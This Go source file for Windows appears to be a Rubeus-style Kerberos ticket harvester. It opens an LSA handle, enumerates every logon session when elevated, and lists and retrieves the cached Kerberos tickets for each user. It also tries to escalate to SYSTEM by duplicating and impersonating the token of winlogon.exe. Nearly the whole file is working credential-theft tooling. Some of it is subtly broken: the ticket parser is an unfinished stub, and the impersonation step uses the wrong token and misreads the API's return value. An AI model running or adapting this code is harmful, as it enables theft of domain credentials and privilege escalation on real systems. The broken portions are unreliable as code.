//go:build windows
// +build windows

package gkirby

import (
	"encoding/asn1"
	"fmt"
	"golang.org/x/sys/windows"
	"strings"
	"time"
	"unsafe"
)

const (
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_READ           = 0x0010
)

// enums
type LogonType uint32
type TicketFlags uint32
type KerbProtocolMessageType uint32

const (
	LOGON32_LOGON_INTERACTIVE       LogonType = 2
	LOGON32_LOGON_NETWORK           LogonType = 3
	LOGON32_LOGON_BATCH             LogonType = 4
	LOGON32_LOGON_SERVICE           LogonType = 5
	LOGON32_LOGON_UNLOCK            LogonType = 7
	LOGON32_LOGON_NETWORK_CLEARTEXT LogonType = 8
	LOGON32_LOGON_NEW_CREDENTIALS   LogonType = 9
)

const (
	TicketReserved         TicketFlags = 0x80000000
	TicketForwardable      TicketFlags = 0x40000000
	TicketForwarded        TicketFlags = 0x20000000
	TicketProxiable        TicketFlags = 0x10000000
	TicketProxy            TicketFlags = 0x08000000
	TicketMayPostdate      TicketFlags = 0x04000000
	TicketPostdated        TicketFlags = 0x02000000
	TicketInvalid          TicketFlags = 0x01000000
	TicketRenewable        TicketFlags = 0x00800000
	TicketInitial          TicketFlags = 0x00400000
	TicketPreAuthent       TicketFlags = 0x00200000
	TicketHWAuthent        TicketFlags = 0x00100000
	TicketOkAsDelegate     TicketFlags = 0x00040000
	TicketAnonymous        TicketFlags = 0x00020000
	TicketNameCanonicalize TicketFlags = 0x00010000
)

const (
	KerbQueryTicketCacheExMessage    KerbProtocolMessageType = 14
	KerbRetrieveEncodedTicketMessage KerbProtocolMessageType = 8
)

type SessionCred struct {
	LogonSession LogonSessionData
	Tickets      []KrbTicket
}

type KrbTicket struct {
	StartTime      time.Time
	EndTime        time.Time
	RenewTime      time.Time
	TicketFlags    TicketFlags
	EncryptionType int32
	ServerName     string
	ServerRealm    string
	ClientName     string
	ClientRealm    string
	KrbCred        *KrbCred
}

type KrbCred struct {
	Pvno    int
	MsgType int
	Tickets []Ticket
	EncPart EncKrbCredPart
}

type Ticket struct {
	TktVno  int32         `asn1:"explicit,tag:0"`
	Realm   string        `asn1:"explicit,tag:1"`
	SName   PrincipalName `asn1:"explicit,tag:2"`
	EncPart EncryptedData `asn1:"explicit,tag:3"`
}

// PrincipalName matches the ASN.1 structure
type PrincipalName struct {
	NameType   int32
	NameString []string
}

type EncryptedData struct {
	EType  int32
	KVNO   int32
	Cipher []byte
}

// EncKrbCredPart structure
type EncKrbCredPart struct {
	Raw        []byte
	TicketInfo []KrbCredInfo
}

// KrbCredInfo structure
type KrbCredInfo struct {
	Key       EncryptionKey
	PRealm    *string
	PName     *PrincipalName
	Flags     *asn1.BitString
	AuthTime  *time.Time
	StartTime *time.Time
	EndTime   *time.Time
	RenewTill *time.Time
	SRealm    *string
	SName     *PrincipalName
	CAddr     []HostAddress
}

type EncryptionKey struct {
	KeyType  int32
	KeyValue []byte
}

type Elevation struct {
	TokenIsElevated uint32
}

type TokenStatistics struct {
	TokenID            windows.LUID
	AuthenticationId   windows.LUID
	ExpirationTime     int64
	TokenType          uint32
	ImpersonationLevel uint32
	DynamicCharged     uint32
	DynamicAvailable   uint32
	GroupCount         uint32
	PrivilegeCount     uint32
	ModifiedId         windows.LUID
}

type SecurityLogonSessionData struct {
	Size                  uint32
	LoginID               windows.LUID
	Username              LsaString
	LoginDomain           LsaString
	AuthenticationPackage LsaString
	LogonType             uint32
	Session               uint32
	PSiD                  uintptr
	LoginTime             uint64
	LogonServer           LsaString
	DnsDomainName         LsaString
	Upn                   LsaString
}

type PrincipalNameData struct {
	nameType   PrincipalName
	nameString []string
}

type HostAddresses []HostAddress

type HostAddress struct {
	addrType    int32
	addressData []byte
}

type LsaString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uintptr
}

type LsaStringOut struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uintptr
}

type SecurityHandle struct {
	LowPart  uintptr
	HighPart uintptr
}

type LogonSessionData struct {
	LogonID               windows.LUID
	Username              string
	LogonDomain           string
	AuthenticationPackage string
	LogonType             LogonType
	Session               int32
	Sid                   *windows.SID
	LogonTime             time.Time
	LogonServer           string
	DnsDomainName         string
	Upn                   string
}

type KerbQueryTktCacheRequest struct {
	MessageType KerbProtocolMessageType
	_           uint32
	LogonId     windows.LUID
}

type QueryTktCacheResponse struct {
	MessageType    KerbProtocolMessageType
	CountOfTickets uint32
	Tickets        [1]KerbTicketCacheInfoEx
}

type KerbTicketCacheInfoEx struct {
	ClientName     LsaString
	ClientRealm    LsaString
	ServerName     LsaString
	ServerRealm    LsaString
	StartTime      int64
	EndTime        int64
	RenewTime      int64
	EncryptionType int32
	TicketFlags    uint32
}

type KerbRetrieveTktRequest struct {
	MessageType       KerbProtocolMessageType
	LogonId           windows.LUID
	TargetName        LsaString
	TicketFlags       uint32
	CacheOptions      uint32
	EncryptionType    int32
	CredentialsHandle SecurityHandle
}

type KerbRetrieveTktResponse struct {
	Ticket KerbExternalTicket
}

type KerbExternalTicket struct {
	ServiceName         uintptr
	TargetName          uintptr
	ClientName          uintptr
	DomainName          LsaStringOut
	TargetDomainName    LsaStringOut
	AltTargetDomainName LsaStringOut
	SessionKey          KerbCryptoKey
	TicketFlags         uint32
	Flags               uint32
	KeyExpirationTime   int64
	StartTime           int64
	EndTime             int64
	RenewUntil          int64
	TimeSkew            int64
	EncodedTicketSize   int32
	EncodedTicket       uintptr
}

type KerbCryptoKey struct {
	KeyType int32
	Length  int32
	Value   uintptr
}

// dll imports
var (
	secur32                        = windows.NewLazyDLL("secur32.dll")
	advapi32                       = windows.NewLazyDLL("advapi32.dll")
	LsaConnectUntrusted            = secur32.NewProc("LsaConnectUntrusted")
	LsaLookupAuthenticationPackage = secur32.NewProc("LsaLookupAuthenticationPackage")
	LsaCallAuthenticationPackage   = secur32.NewProc("LsaCallAuthenticationPackage")
	LsaGetLogonSessionData         = secur32.NewProc("LsaGetLogonSessionData")
	LsaFreeReturnBuffer            = secur32.NewProc("LsaFreeReturnBuffer")
	LsaEnumerateLogonSessions      = secur32.NewProc("LsaEnumerateLogonSessions")
	ImpersonateLoggedOnUser        = advapi32.NewProc("ImpersonateLoggedOnUser")
	RevertToSelf                   = advapi32.NewProc("RevertToSelf")
)

const (
	windowsToUnixEpochIntervals = 116444736000000000
)

/*
misc helper funcs
*/
func fileTimeToTime(fileTime int64) time.Time {
	nsec := (fileTime - windowsToUnixEpochIntervals) * 100
	return time.Unix(0, nsec).Local()
}

func (t TicketFlags) String() string {
	var flags []string

	flagMap := map[TicketFlags]string{
		TicketReserved:         "reserved",
		TicketForwardable:      "forwardable",
		TicketForwarded:        "forwarded",
		TicketProxiable:        "proxiable",
		TicketProxy:            "proxy",
		TicketMayPostdate:      "may_postdate",
		TicketPostdated:        "postdated",
		TicketInvalid:          "invalid",
		TicketRenewable:        "renewable",
		TicketInitial:          "initial",
		TicketPreAuthent:       "pre_authent",
		TicketHWAuthent:        "hw_authent",
		TicketOkAsDelegate:     "ok_as_delegate",
		TicketAnonymous:        "anonymous",
		TicketNameCanonicalize: "name_canonicalize",
	}

	for flag, name := range flagMap {
		if t&flag != 0 {
			flags = append(flags, name)
		}
	}

	if len(flags) == 0 {
		return "empty"
	}

	return strings.Join(flags, ", ")
}

/*
asn.1 helper funcs
*/
func parseTicketData(encodedTicket []byte) (*KrbCred, error) {
	// todo: parse
	fmt.Printf("[+] raw bytes: % X\n", encodedTicket)

	return nil, nil
}

func DumpASN1(data []byte, indent string) {
	var raw asn1.RawValue
	rest, err := asn1.Unmarshal(data, &raw)
	if err != nil {
		fmt.Printf("%sError: %v\n", indent, err)
		return
	}

	fmt.Printf("%sClass: %d, Tag: %d, IsCompound: %v, Len: %d\n",
		indent, raw.Class, raw.Tag, raw.IsCompound, len(raw.Bytes))

	if raw.IsCompound {
		remaining := raw.Bytes
		for len(remaining) > 0 {
			var innerRaw asn1.RawValue
			var err error
			remaining, err = asn1.Unmarshal(remaining, &innerRaw)
			if err != nil {
				fmt.Printf("%s  Error parsing compound: %v\n", indent, err)
				break
			}
			DumpASN1(innerRaw.FullBytes, indent+"  ")
		}
	}

	if len(rest) > 0 {
		fmt.Printf("%sRemaining: %d bytes\n", indent, len(rest))
		DumpASN1(rest, indent)
	}
}

/*
kerberos helper funcs
*/
func lsaStrToString(s LsaString) string {
	if s.Length == 0 {
		return ""
	}
	buf := make([]uint16, s.Length/2)
	copy(buf, (*[1 << 30]uint16)(unsafe.Pointer(s.Buffer))[:s.Length/2])
	return windows.UTF16ToString(buf)
}

func enumerateLogonSessions() ([]windows.LUID, error) {
	fmt.Printf("[*] Enumerating logon sessions\n")
	var count uint32
	var luids uintptr

	ret, _, _ := LsaEnumerateLogonSessions.Call(
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&luids)),
	)

	if ret != 0 {
		fmt.Printf("[-] LsaEnumerateLogonSessions failed: 0x%x\n", ret)
		return nil, fmt.Errorf("LsaEnumerateLogonSessions failed with error: 0x%x", ret)
	}

	luidSlice := make([]windows.LUID, count)
	for i := uint32(0); i < count; i++ {
		luid := (*windows.LUID)(unsafe.Pointer(luids + uintptr(i)*unsafe.Sizeof(windows.LUID{})))
		luidSlice[i] = *luid
		fmt.Printf("[+] Found session LUID: 0x%x:0x%x\n", luid.HighPart, luid.LowPart)
	}

	defer LsaFreeReturnBuffer.Call(luids)
	fmt.Printf("[+] Found %d logon sessions\n", count)
	return luidSlice, nil
}

func getCurrentLUID() (windows.LUID, error) {
	fmt.Printf("[*] Getting current LUID\n")
	var currentToken windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &currentToken)
	if err != nil {
		fmt.Printf("[-] OpenProcessToken failed: %v\n", err)
		return windows.LUID{}, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer currentToken.Close()

	var tokenStats TokenStatistics
	var returnLength uint32

	err = windows.GetTokenInformation(currentToken, windows.TokenStatistics, (*byte)(unsafe.Pointer(&tokenStats)), uint32(unsafe.Sizeof(tokenStats)), &returnLength)
	if err != nil {
		fmt.Printf("[-] GetTokenInformation failed: %v\n", err)
		return windows.LUID{}, fmt.Errorf("GetTokenInformation failed: %v", err)
	}

	fmt.Printf("[+] Current LUID: 0x%x:0x%x\n",
		tokenStats.AuthenticationId.HighPart,
		tokenStats.AuthenticationId.LowPart)
	return tokenStats.AuthenticationId, nil
}

func getLogonSessionData(luid windows.LUID) (*LogonSessionData, error) {
	var sessionDataPtr uintptr

	ret, _, _ := LsaGetLogonSessionData.Call(
		uintptr(unsafe.Pointer(&luid)),
		uintptr(unsafe.Pointer(&sessionDataPtr)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("LsaGetLogonSessionData failed with error: 0x%x", ret)
	}

	defer LsaFreeReturnBuffer.Call(sessionDataPtr)

	sessionData := (*SecurityLogonSessionData)(unsafe.Pointer(sessionDataPtr))

	result := &LogonSessionData{
		LogonID:               sessionData.LoginID,
		Username:              lsaStrToString(sessionData.Username),
		LogonDomain:           lsaStrToString(sessionData.LoginDomain),
		AuthenticationPackage: lsaStrToString(sessionData.AuthenticationPackage),
		LogonType:             LogonType(sessionData.LogonType),
		Session:               int32(sessionData.Session),
		LogonTime:             time.Unix(0, int64(sessionData.LoginTime)*100),
		LogonServer:           lsaStrToString(sessionData.LogonServer),
		DnsDomainName:         lsaStrToString(sessionData.DnsDomainName),
		Upn:                   lsaStrToString(sessionData.Upn),
	}

	if sessionData.PSiD != 0 {
		var sidStr *uint16
		err := windows.ConvertSidToStringSid((*windows.SID)(unsafe.Pointer(sessionData.PSiD)), &sidStr)
		if err == nil {
			result.Sid, _ = windows.StringToSid(windows.UTF16PtrToString(sidStr))
			windows.LocalFree(windows.Handle(unsafe.Pointer(sidStr)))
		}
	}

	return result, nil
}

func isAdmin() (bool, error) {
	fmt.Printf("[*] Checking admin status\n")
	var token windows.Token
	procHandle := windows.CurrentProcess()

	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY, &token)
	if err != nil {
		fmt.Printf("[-] OpenProcessToken failed: %v\n", err)
		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer token.Close()

	var elevated uint32
	var size uint32
	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevated)), uint32(unsafe.Sizeof(elevated)), &size)
	if err != nil {
		fmt.Printf("[-] GetTokenInformation failed: %v\n", err)
		return false, fmt.Errorf("GetTokenInformation failed: %v", err)
	}

	isElevated := elevated != 0
	fmt.Printf("[+] Admin status: %v\n", isElevated)
	return isElevated, nil
}

func newLSAString(s string) *LsaString {
	bytes := []byte(s)
	return &LsaString{
		Length:        uint16(len(bytes)),
		MaximumLength: uint16(len(bytes)),
		Buffer:        uintptr(unsafe.Pointer(&bytes[0])),
	}
}

func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LUID, targetName string) (*KrbCred, error) {
	if lsaHandle == 0 {
		return nil, fmt.Errorf("invalid LSA handle")
	}

	isAdmin, _ := isAdmin()
	fmt.Printf("[*] Extracting ticket with admin: %v, LUID: 0x%x:0x%x\n", isAdmin, luid.HighPart, luid.LowPart)

	targetNameUTF16 := windows.StringToUTF16(targetName)
	nameLen := uint16(len(targetNameUTF16) * 2)

	requestSize := unsafe.Sizeof(KerbRetrieveTktRequest{})
	totalSize := requestSize + uintptr(nameLen)
	fmt.Printf("[*] Request size: %d, Total size: %d\n", requestSize, totalSize)

	buffer := make([]byte, totalSize)
	bufferPtr := unsafe.Pointer(&buffer[0])

	request := (*KerbRetrieveTktRequest)(bufferPtr)
	request.MessageType = KerbRetrieveEncodedTicketMessage

	if !isAdmin {
		request.LogonId = windows.LUID{LowPart: 0, HighPart: 0}
		fmt.Printf("[*] Using null LUID for non-admin context\n")
	} else {
		request.LogonId = luid
		fmt.Printf("[*] Using provided LUID: 0x%x:0x%x\n", luid.HighPart, luid.LowPart)
	}

	request.TicketFlags = 0
	request.CacheOptions = 8
	request.EncryptionType = 0
	request.CredentialsHandle = SecurityHandle{}

	targetNamePtr := uintptr(bufferPtr) + requestSize
	fmt.Printf("[*] Target name buffer offset: %d\n", requestSize)

	stringData := unsafe.Slice((*byte)(unsafe.Pointer(&targetNameUTF16[0])), nameLen)
	targetSlice := unsafe.Slice((*byte)(unsafe.Pointer(targetNamePtr)), nameLen)
	copy(targetSlice, stringData)

	request.TargetName = LsaString{
		Length:        nameLen - 2,
		MaximumLength: nameLen,
		Buffer:        targetNamePtr,
	}
	fmt.Printf("[*] LSA String - Length: %d, MaxLength: %d\n", request.TargetName.Length, request.TargetName.MaximumLength)

	fmt.Printf("[*] Attempting to extract ticket for %s (Admin: %v)\n", targetName, isAdmin)
	fmt.Printf("[*] Target name length: %d bytes\n", nameLen)

	var responsePtr uintptr
	var returnLength uint32
	var protocolStatus uint32

	fmt.Printf("[*] Calling LsaCallAuthenticationPackage...\n")
	ret, _, _ := LsaCallAuthenticationPackage.Call(
		uintptr(lsaHandle),
		uintptr(authPackage),
		uintptr(bufferPtr),
		totalSize,
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&returnLength)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	fmt.Printf("[*] LsaCallAuthenticationPackage returned: 0x%x, Protocol Status: 0x%x\n", ret, protocolStatus)

	if ret != 0 {
		return nil, fmt.Errorf("LsaCallAuthenticationPackage failed: 0x%x", ret)
	}

	if protocolStatus != 0 {
		return nil, fmt.Errorf("protocol status error: 0x%x", protocolStatus)
	}

	fmt.Printf("[*] Response pointer: 0x%x, Return length: %d\n", responsePtr, returnLength)
	if responsePtr != 0 {
		defer LsaFreeReturnBuffer.Call(responsePtr)
		response := (*KerbRetrieveTktResponse)(unsafe.Pointer(responsePtr))
		encodedTicketSize := response.Ticket.EncodedTicketSize
		fmt.Printf("[*] Encoded ticket size: %d\n", encodedTicketSize)

		if encodedTicketSize > 0 {
			fmt.Printf("[*] Copying encoded ticket data...\n")
			encodedTicket := make([]byte, encodedTicketSize)
			copy(encodedTicket,
				(*[1 << 30]byte)(unsafe.Pointer(response.Ticket.EncodedTicket))[:encodedTicketSize])

			fmt.Printf("[DEBUG] Full ASN.1 structure:\n")
			DumpASN1(encodedTicket, "  ")

			fmt.Printf("[*] Attempting to parse ticket data...\n")
			krbCred, err := parseTicketData(encodedTicket)
			if err != nil {
				return nil, fmt.Errorf("failed to parse ticket data: %v", err)
			}
			fmt.Printf("[+] Successfully parsed ticket data\n")
			return krbCred, nil
		}
		fmt.Printf("[-] Encoded ticket size is 0\n")
	} else {
		fmt.Printf("[-] Response pointer is null\n")
	}

	return nil, fmt.Errorf("KRB_RETRIEVE_TKT_RESPONSE failed")
}

func enumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]SessionCred, error) {
	var luids []windows.LUID
	var sessionCreds []SessionCred

	isAdmin, err := isAdmin()
	if err != nil {
		return sessionCreds, fmt.Errorf("failed to check if admin is enabled: %v", err)
	}

	if isAdmin {
		luids, err = enumerateLogonSessions()
		if err != nil {
			return sessionCreds, fmt.Errorf("failed to enumerate logon ids: %v", err)
		}
	} else {
		luid, err := getCurrentLUID()
		if err != nil {
			return sessionCreds, fmt.Errorf("failed to get current luid: %v", err)
		}
		luids = append(luids, luid)
	}

	for _, luid := range luids {
		//value := uint64(luid.HighPart)<<32 | uint64(luid.LowPart)
		//fmt.Printf("[+] current luid: 0x%x\n", value)

		sessionData, err := getLogonSessionData(luid)
		if err != nil {
			return sessionCreds, fmt.Errorf("[-] failed to get logon session data, err: %v\n", err)
		}

		var sessionCred SessionCred
		sessionCred.LogonSession = *sessionData
		sessionCred.Tickets = []KrbTicket{}

		var responsePtr uintptr
		pResponsePtr := unsafe.Pointer(&responsePtr)
		var returnLength = 0
		var protocolStatus = 0

		var ticketCacheRequest KerbQueryTktCacheRequest
		ticketCacheRequest.MessageType = KerbQueryTicketCacheExMessage

		if isAdmin {
			ticketCacheRequest.LogonId = sessionData.LogonID
		} else {
			// https://github.com/GhostPack/Rubeus/blob/master/Rubeus/lib/LSA.cs#L303
			ticketCacheRequest.LogonId = windows.LUID{LowPart: 0, HighPart: 0}
		}

		var padding uint32 = 0

		// Create properly sized buffer for request
		requestSize := unsafe.Sizeof(ticketCacheRequest) + unsafe.Sizeof(padding)
		buffer := make([]byte, requestSize)

		// Copy request into buffer
		*(*KerbQueryTktCacheRequest)(unsafe.Pointer(&buffer[0])) = ticketCacheRequest

		ret, _, err := LsaCallAuthenticationPackage.Call(
			uintptr(lsaHandle),
			uintptr(authPackage),
			uintptr(unsafe.Pointer(&ticketCacheRequest)),
			uintptr(unsafe.Sizeof(ticketCacheRequest)),
			uintptr(pResponsePtr),
			uintptr(unsafe.Pointer(&returnLength)),
			uintptr(unsafe.Pointer(&protocolStatus)),
		)
		if ret != 0 {
			return sessionCreds, fmt.Errorf("[-] LsaCallAuthenticationPackage failed, err: %v\n", err)
		}

		if responsePtr != 0 {
			defer LsaFreeReturnBuffer.Call(responsePtr)

			response := (*QueryTktCacheResponse)(unsafe.Pointer(responsePtr))

			if response.CountOfTickets > 0 {
				fmt.Printf("[*] Found %d tickets in cache for session\n", response.CountOfTickets)
				ticketSize := unsafe.Sizeof(KerbTicketCacheInfoEx{})

				for i := uint32(0); i < response.CountOfTickets; i++ {
					currentTicketPtr := responsePtr + 8 + uintptr(i)*ticketSize
					ticketInfo := (*KerbTicketCacheInfoEx)(unsafe.Pointer(currentTicketPtr))

					ticket := &KrbTicket{
						StartTime:      fileTimeToTime(ticketInfo.StartTime),
						EndTime:        fileTimeToTime(ticketInfo.EndTime),
						RenewTime:      fileTimeToTime(ticketInfo.RenewTime),
						TicketFlags:    TicketFlags(ticketInfo.TicketFlags),
						EncryptionType: ticketInfo.EncryptionType,
						ServerName:     lsaStrToString(ticketInfo.ServerName),
						ServerRealm:    lsaStrToString(ticketInfo.ServerRealm),
						ClientName:     lsaStrToString(ticketInfo.ClientName),
						ClientRealm:    lsaStrToString(ticketInfo.ClientRealm),
					}

					sessionCred.Tickets = append(sessionCred.Tickets, *ticket)
				}
			}
		}
		sessionCreds = append(sessionCreds, sessionCred)
	}

	return sessionCreds, nil
}

func isHighIntegrity() (bool, error) {
	var token windows.Token
	h := windows.CurrentProcess()
	err := windows.OpenProcessToken(h, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false, err
	}
	defer token.Close()

	var isElevated uint32
	var returnedLen uint32
	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), uint32(unsafe.Sizeof(isElevated)), &returnedLen)
	if err != nil {
		return false, err
	}

	return isElevated != 0, nil
}

func isSystem() (bool, error) {
	var token windows.Token
	procHandle := windows.CurrentProcess()
	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer token.Close()

	user, err := token.GetTokenUser()
	if err != nil {
		return false, fmt.Errorf("GetTokenUser failed: %v", err)
	}

	systemSid, err := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
	if err != nil {
		return false, fmt.Errorf("CreateWellKnownSid failed: %v", err)
	}

	return windows.EqualSid(user.User.Sid, systemSid), nil
}

func getSystem() bool {
	fmt.Printf("[*] Attempting to get SYSTEM privileges\n")
	isHighIntegrity, err := isHighIntegrity()
	if err != nil {
		fmt.Printf("[-] Failed to check integrity level: %v\n", err)
		return false
	}

	if isHighIntegrity {
		fmt.Printf("[*] Current process is high integrity, looking for winlogon.exe\n")
		snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
		if err != nil {
			fmt.Printf("[-] Failed to create process snapshot: %v\n", err)
			return false
		}
		defer windows.CloseHandle(snapshot)

		var procEntry windows.ProcessEntry32
		procEntry.Size = uint32(unsafe.Sizeof(procEntry))
		if err := windows.Process32First(snapshot, &procEntry); err != nil {
			fmt.Printf("[-] Failed to get first process: %v\n", err)
			return false
		}

		for {
			processName := windows.UTF16ToString(procEntry.ExeFile[:])
			if processName == "winlogon.exe" {
				fmt.Printf("[+] Found winlogon.exe (PID: %d)\n", procEntry.ProcessID)
				handle, err := windows.OpenProcess(
					PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
					false,
					procEntry.ProcessID,
				)
				if err != nil {
					fmt.Printf("[-] Failed to open winlogon.exe: %v\n", err)
					return false
				}

				var token windows.Token
				err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE, &token)
				if err != nil {
					fmt.Printf("[-] Failed to open process token: %v\n", err)
					return false
				}
				defer token.Close()

				var duplicateToken windows.Token
				err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil, windows.SecurityImpersonation, windows.TokenPrimary, &duplicateToken)
				if err != nil {
					fmt.Printf("[-] Failed to duplicate token: %v\n", err)
					return false
				}

				ret, _, err := ImpersonateLoggedOnUser.Call(uintptr(token))
				if ret != 0 {
					fmt.Printf("[-] Failed to impersonate user: %v\n", err)
					return false
				}

				fmt.Printf("[+] Successfully impersonated SYSTEM token\n")
				return true
			}

			err = windows.Process32Next(snapshot, &procEntry)
			if err != nil {
				if err == windows.ERROR_NO_MORE_FILES {
					fmt.Printf("[-] Could not find winlogon.exe process\n")
					break
				}
				fmt.Printf("[-] Error enumerating processes: %v\n", err)
				return false
			}
		}
		return false
	}
	fmt.Printf("[*] Process already running with high integrity\n")
	return false
}

func getLsaHandle() (windows.Handle, error) {
	fmt.Printf("[*] Getting LSA handle\n")
	isHighIntegrity, err := isHighIntegrity()
	if err != nil {
		fmt.Printf("[-] Failed to check integrity level: %v\n", err)
		return 0, err
	}

	fmt.Printf("[*] Is high integrity: %v\n", isHighIntegrity)

	isSystem, err := isSystem()
	if err != nil {
		fmt.Printf("[-] Failed to check SYSTEM status: %v\n", err)
		return 0, err
	}

	var lsaHandle windows.Handle
	if isHighIntegrity && !isSystem {
		fmt.Printf("[*] High integrity but not SYSTEM, attempting privilege escalation\n")
		gotSystem := getSystem()
		if !gotSystem {
			fmt.Printf("[-] Failed to get SYSTEM privileges\n")
			return 0, fmt.Errorf("failed to get SYSTEM privileges")
		}
	}

	ret, _, err := LsaConnectUntrusted.Call(
		uintptr(unsafe.Pointer(&lsaHandle)),
	)
	if ret != 0 {
		fmt.Printf("[-] LsaConnectUntrusted failed: %v\n", err)
		return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed: %v", err)
	}

	fmt.Printf("[+] Successfully obtained LSA handle\n")
	return lsaHandle, nil
}

func getAuthenticationPackage(lsaHandle windows.Handle, lsaString *LsaString) (uint32, error) {
	var authPackage uint32

	ret, _, err := LsaLookupAuthenticationPackage.Call(
		uintptr(lsaHandle),
		uintptr(unsafe.Pointer(lsaString)),
		uintptr(unsafe.Pointer(&authPackage)),
	)
	if ret != 0 {
		return authPackage, fmt.Errorf("LsaLookupAuthenticationPackage failed: %v", err)
	}

	return authPackage, nil
}

/*
* public bois
 */
func GetKerberosTickets() []map[string]interface{} {
	fmt.Printf("[*] Starting Kerberos ticket collection\n")
	var ticketCache []map[string]interface{}

	lsaHandle, err := getLsaHandle()
	if err != nil {
		fmt.Printf("[-] Failed to get LSA handle: %v\n", err)
		return nil
	}

	kerberosString := newLSAString("kerberos")
	authPackage, err := getAuthenticationPackage(lsaHandle, kerberosString)
	if err != nil {
		fmt.Printf("[-] Failed to get authentication package: %v\n", err)
		return nil
	}
	fmt.Printf("[+] Got Kerberos authentication package\n")

	sessionCreds, err := enumerateTickets(lsaHandle, authPackage)
	if err != nil {
		fmt.Printf("[-] Failed to enumerate tickets: %v\n", err)
		return nil
	}
	fmt.Printf("[+] Found %d session credentials\n", len(sessionCreds))

	ticketCache = make([]map[string]interface{}, 0)
	for _, cred := range sessionCreds {
		fmt.Printf("[*] Processing tickets for %s\\%s\n", cred.LogonSession.LogonDomain, cred.LogonSession.Username)
		for _, ticket := range cred.Tickets {
			extractedTicket, err := extractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, ticket.ServerName)
			if err != nil {
				fmt.Printf("[-] Failed to extract ticket for %s: %v\n", ticket.ServerName, err)
				continue
			}
			fmt.Printf("[+] Successfully extracted ticket for %s\n", ticket.ServerName)

			ticket := map[string]interface{}{
				"username":    cred.LogonSession.Username,
				"domain":      cred.LogonSession.LogonDomain,
				"logonId":     cred.LogonSession.LogonID.LowPart,
				"serverName":  ticket.ServerName,
				"serverRealm": ticket.ServerRealm,
				"startTime":   ticket.StartTime.Format(time.RFC3339),
				"endTime":     ticket.EndTime.Format(time.RFC3339),
				"renewTime":   ticket.RenewTime.Format(time.RFC3339),
				"flags":       ticket.TicketFlags.String(),
				"encType":     ticket.EncryptionType,
				"krbCred":     extractedTicket,
			}
			ticketCache = append(ticketCache, ticket)
		}
	}

	if len(ticketCache) > 0 {
		fmt.Printf("[+] Successfully collected %d Kerberos tickets\n", len(ticketCache))
		return ticketCache
	}

	fmt.Printf("[-] No Kerberos tickets found\n")
	return nil
}
